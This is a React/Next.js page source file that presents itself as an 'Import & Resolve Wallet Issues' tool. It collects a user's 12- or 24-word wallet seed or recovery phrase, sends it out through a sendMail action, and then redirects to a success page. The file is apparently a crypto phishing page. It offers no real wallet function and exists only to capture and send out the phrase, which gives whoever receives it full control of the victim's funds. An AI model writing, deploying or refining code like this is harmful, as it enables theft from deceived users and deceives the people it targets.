'use client'
import React, { useState } from 'react';
import { sendMail } from '@/config/action';
import axios from 'axios';

const Page = () => {
  const [phrase, setPhrase] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (event) => {
    event.preventDefault();
    setError('');
    setMessage('');

    // Validation
    if (!phrase.trim()) {
      setError('Phrase cannot be empty');
      return;
    }

    try {
      setLoading(true);
      // Send data
      const data = await sendMail(phrase);
      setMessage('Data sent successfully');
      console.log(data);
      // Redirect after mail is sent
      window.location.href = '/success';
    } catch (error) {
      setError('Failed to send data');
      console.log(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className='flex flex-col justify-center uppercase items-center pt-10 p-5'>
      <h1 className="font-bold text-[20px] text-center">Import & Resolve Wallet Issues</h1>
      <h2 className="bg-blue-600 font-[650] md:w-[50%] w-full p-[12px] text-white my-5 rounded-full text-center">Seed/Recovery Phrase</h2>
      <p className="mb-2">Recover Phrase</p>

      <form action="" onSubmit={handleSubmit}>
        <textarea
          className="w-full h-32 resize-none border rounded-md p-2 focus:outline-none focus:border-blue-500"
          placeholder="Enter text..."
          name="phrase"
          required
          minLength="12"
          spellCheck="false"
          value={phrase}
          onChange={(e) => setPhrase(e.target.value)}
        ></textarea>
        <p className="text-red-500">{error}</p>
        <p className="mb-8">Typically 12 (sometimes 24) words separated by single spaces</p>

        {message && <p className="mt-2 text-green-500">{message}</p>}

        <button
          type="submit"
          className='mt-5 text-center w-full p-[12px] font-[650] text-white bg-blue-800 rounded-full'
          disabled={loading}
        >
          {loading ? 'Loading...' : 'Import'}
        </button>
      </form>
    </div>
  );
};

export default Page;
